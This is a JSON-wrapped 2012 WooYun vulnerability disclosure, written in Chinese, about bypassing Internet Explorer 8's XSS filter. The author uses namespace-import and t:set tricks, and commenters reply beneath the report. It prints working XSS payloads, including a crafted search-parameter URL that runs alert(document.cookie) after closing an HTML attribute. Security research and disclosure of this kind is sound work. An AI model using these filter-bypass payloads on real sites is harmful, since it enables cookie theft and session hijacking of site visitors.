{"id": 16794, "wybug_id": "wooyun-2012-013883", "wybug_title": "IE8 xss filter bypass (xss过滤器绕过)", "wybug_corp": "微软", "wybug_author": "gainover", "wybug_date": "2012-10-25 10:57", "wybug_open_date": "2012-10-25 22:53", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-10-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： IE 8 XSS 过滤器绕过。感谢@Sogili牛为本绕过通用性实现上提供的tricks。pkav.net 详细说明：  1. 在IE8中，可以通过 <xml> <?import> + <t:set ..> 的方式来构成一个XSS vector。在测试过程中发现， <?import> 同样可写为 <import>。也就是说。下面的代码都可以运行JS代码。\n<html>     <body>     <div>     <div id=\"x\">x</div>     <?xml:namespace prefix=\"t\">     <?import namespace=\"t\" implementation=\"#default#time2\">     <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;\">     </div>     </body>     </html>\n\n<html>     <body>     <div>     <div id=\"x\">x</div>     <xml:namespace prefix=\"t\">     <import namespace=\"t\" implementation=\"#default#time2\">     <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;\">     </div>     </body>     </html>\n2. 利用这个技巧，我发现可以成功绕过IE 8 的 xss filter 测试例子如下：\nhttp://xsst.sinaapp.com/example/1-1.php?page=<div id=x>x</div><xml:namespace prefix=t><import namespace=t implementation=%23default%23time2><t:set/attributename=innerHTML targetElement=x to=%26lt;img%26%2311;src=x:x%26%2311;onerror%26%2311;=alert%26%23x28;1%26%23x29;%26gt;>\n如果用<?import..>，则会触发过滤器。3. 当然，上面这个代码，只适用于 <HTML标签>{输出在这里}</HTML标签> 的情况。我们经常会遇到类似 <input type=\"text\" value=\"{输出在这里}\">  的情况。这样一来，我们需要在代码前面加上 \"> 来闭合HTML属性。但是问题来啦， \"> 会触发XSS过滤器，过滤掉我们代码中的敏感词。@jackmasa (https://twitter.com/jackmasa)，也就是我们乌云的 @Sogili 牛，给了一个绕过的tricks， \"x> 就不会触发XSS过滤器了， x代表任意字母。 非常感谢。这样一来，我们上面的代码可以进一步通用化。\nhttp://www.xxxx.com/product.php?search=\"id=><div/id=x>x</div><xml:namespace prefix=t><import namespace=t implementation=%23default%23time2><t:set/attributename=innerHTML targetElement=x to=%26lt;img%26%2311;src=x:x%26%2311;onerror%26%2311;=alert%26%23x28;document.cookie%26%23x29;%26gt;>\n4. 至于具体怎么利用，恩，大家自己看着办。   漏洞证明：  \n\n   修复方案：  微软已经在IE10中修复了这个问题。将会在近期推出win7的IE10版本。 故IE8中应该不会修复了。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-10-25 11:09 |    \t\t苦逼老爷爷 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:17        | 用户太懒什么都没留下)\t\t \n  求忽略。。正为这事伤脑筋中。    \n     2012-10-25 12:33 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @苦逼老爷爷 zone里也有=-=！    \n     2012-10-25 15:56 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  请联系到厂商！    \n     2012-10-25 20:51 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  二哥又在研究ie内核了    \n     2012-10-25 21:48 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @shack2 = = 鬼的内核。。没那水平。 就是碰巧发现而已。。    \n     2012-10-25 22:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  怒顶！    \n     2012-10-26 00:16 |    \t\t/fd \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        )\t\t \n  未能联系到厂商或者厂商积极拒绝    \n     2012-10-29 21:25 |    \t\t鬼哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:13        | 鬼哥 ！！！！)\t\t \n  必须顶。。佩服。    \n     2012-11-13 10:49 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  0 day啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}